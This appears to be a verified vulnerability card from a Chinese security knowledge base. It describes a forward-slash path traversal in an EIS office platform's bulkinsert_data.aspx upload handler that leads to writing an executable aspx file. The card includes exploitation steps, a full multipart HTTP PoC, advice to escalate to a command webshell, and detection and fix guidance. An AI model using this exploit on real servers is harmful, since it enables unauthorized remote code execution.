---
id: web-generic-file-upload-eis-bulkinsert-aspx-filename-traversal
title: EIS 办公平台 bulkinsert_data.aspx 上传：取最后反斜杠后段、正斜杠绕过穿越写入 aspx getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: dotnet-upload-last-backslash-split-forward-slash-traversal
tags:
- file-upload
- dotnet
- aspx
- iis
- path-traversal
- viewstate
- webshell
- oa
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V52
  verified_at: '2026-11-05T09:20:36+08:00'
  notes: 已对照原文与图20/22/23核对：GB_Upload_Click 中 text="/files/"、fileName=PostedFile.FileName、num=LastIndexOf("\\")、empty=(num<=0?("\\"+fileName):fileName.Substring(num))、SaveAs(MapPath(text+empty)) 与图22逐行一致；正斜杠 ../third/shell.aspx 无 \ 走前缀分支，MapPath 归一化穿越到 /third/shell.aspx，反斜杠 ..\third\shell.aspx 会被截成 shell.aspx 落 /files/，卡内对照正确；图23 POST bulkinsert_data.aspx?id=1 携带 __VIEWSTATE/__VIEWSTATEGENERATOR 与 file（test.aspx 内容 <%@ Page Language="C#" %><% Response.Write("test"); %>），响应 500 数据库异常但文件已落盘，访问 /third/shell.aspx 输出 test，getshell 已打通。原文为后台会话前提（Cookie 含 logname/.ASPXAUTH），卡内已标注；PoC 未本机执行。原文未给产品版本，未设置 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/generic/file-upload/web-generic-file-upload-eis-bulkinsert-aspx-filename-traversal/
draft: false
kb_aliases:
- EIS 任意文件上传
- bulkinsert_data.aspx 上传
- 正斜杠绕过反斜杠截断
- 上传目录穿越写 aspx
- ViewState 上传 getshell
- 后台 getshell
---

## 一句话结论

某 EIS 办公平台后台的 `bulkinsert_data.aspx` 上传处理把用户文件名按“最后一个反斜杠”截断后再拼到固定目录 `/files/`，攻击者用正斜杠 `../third/shell.aspx` 绕过截断，`Server.MapPath` 归一化后文件落到可匿名访问且可执行 aspx 的 `/third/` 目录，直接 getshell。

## 原理

- 入口：`bulkinsert_data.aspx` 的 `GB_Upload_Click`，`tpfile.PostedFile` 接收上传文件。
- 代码：`string text = "/files/"; string fileName = tpfile.PostedFile.FileName; int num = fileName.LastIndexOf("\\"); empty = ((num <= 0) ? ("\\" + fileName) : fileName.Substring(num)); tpfile.PostedFile.SaveAs(base.Server.MapPath(text + empty));`。
- 缺陷一：只按反斜杠 `\` 截取“文件名”。Windows 同时把 `/` 当路径分隔符，`../third/shell.aspx` 中没有 `\`，`num <= 0` 走 `"\\" + fileName` 分支，`..` 与 `/` 原样保留。
- 缺陷二：拼接后 `MapPath("/files/" + "\../third/shell.aspx")` 在 .NET 中会被归一化为站点根下的 `/third/shell.aspx`，实现目录穿越。
- 为什么能执行：站点 `web.config` 把 `third` 目录配置为匿名可访问（`<allow users="*" />`）且 IIS 默认解析 `.aspx`；上传目录 `files` 若被禁止脚本执行也不影响，因为文件最终落在 `third`。
- 对照：`..\third\shell.aspx` 会被 `LastIndexOf("\\")` 截成 `\shell.aspx`，落到 `/files/shell.aspx`，路径不可控且可能不可执行；正斜杠正是绕过点。
- 附加条件：该页面为 WebForms，POST 需要先 GET 页面拿到 `__VIEWSTATE` 与 `__VIEWSTATEGENERATOR`，否则 ASP.NET 报 `Invalid ViewState`，事件不会触发。

## 触发条件

- 目标 EIS 办公平台存在后台 `bulkinsert_data.aspx`，攻击者已有可登录的后台会话（文章请求携带 `logname` 与 `.ASPXAUTH`）。
- 页面可正常打开并生成 `__VIEWSTATE`/`__VIEWSTATEGENERATOR`。
- 站点根下存在可写且可执行 `.aspx` 的目录（文章为 `third`，默认匿名可访问）。
- 应用池账户对目标目录有写权限。

## 利用步骤

1. 用后台账号登录，GET `/XX/bulkinsert_data.aspx?id=1`，从响应 HTML 中提取 `__VIEWSTATE` 与 `__VIEWSTATEGENERATOR`。
2. 构造 multipart POST，携带上述两个隐藏字段与 `file` 字段，文件名设为 `../third/shell.aspx`，内容为最小 aspx 马。
3. 发送请求；即使页面因后续数据库报错返回 500，文件通常已在报错前 `SaveAs` 落盘（文章截图响应为数据库连接异常，但文件已写入）。
4. 访问 `/third/shell.aspx`，页面输出 `test`，证明 aspx 被解析执行。
5. 替换为命令执行/文件管理 webshell 或内存马，进一步控制服务器。

## PoC

```http
POST /XX/bulkinsert_data.aspx?id=1 HTTP/1.1
Host: target.example:8001
Cookie: ASP.NET_SessionId=...; Lang=zh-cn; logname=testuser; .ASPXAUTH=...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 1053

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="__VIEWSTATE"

<从 GET 页面响应中提取>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"

<从 GET 页面响应中提取>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="../third/shell.aspx"
Content-Type: application/octet-stream

<%@ Page Language="C#" %><% Response.Write("test"); %>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

```text
# 预期：POST 返回 200 或 500（数据库报错不影响落盘）；
# 访问 http://target.example:8001/third/shell.aspx 输出 test。
# 若用 ..\third\shell.aspx（反斜杠），会被截成 shell.aspx 落到 /files/，利用失败。
```

## 变体与关联

- 变体：目标目录可换成其他 Web 可访问且可执行的目录；也可上传 `web.config` 到子目录开启 aspx 解析，再上传马。
- 变体：若 `files` 目录本身允许执行，`filename=shell.aspx` 即可直接 getshell，无需穿越。
- 关联：[[web-generic-file-upload-ccflow-iis-webconfig-aspx]]（文件名分隔符处理不一致导致穿越的同类逻辑，方向相反）；[[web-generic-file-upload-dotnet-uploadpicture-aspx-webshell]]（.NET 无后缀校验上传）；[[web-generic-file-upload-jiuyin-common-uploadtemppicture-aspx]]（OA 类系统 aspx 上传）。
- 边界：文章在已登录后台的前提下完成利用；未登录能否到达该页需看该页鉴权，不能默认前台可利用。上传依赖 `__VIEWSTATE`，直接构造 POST 不带隐藏字段会失败。

## 检测与防御

- 检测：审计上传代码中 `LastIndexOf("\\")`/`Path.GetFileName` 与 `SaveAs` 组合；监控上传文件名包含 `../`、`..\`、`/` 的请求；监控 Web 目录中新增 `.aspx/.ashx/.asmx/.config` 文件。
- 修复：上传文件名用 `Path.GetFileName` 取纯文件名并重命名为随机值，保存目录固定且不可穿越；对扩展名做白名单，上传目录禁止脚本执行。
- 加固：`third` 等目录不要匿名放行；上传落盘前做规范化路径校验，确保最终路径在预期目录内（比较 `Path.GetFullPath` 前缀）；对后台接口做角色校验与 CSRF 防护。
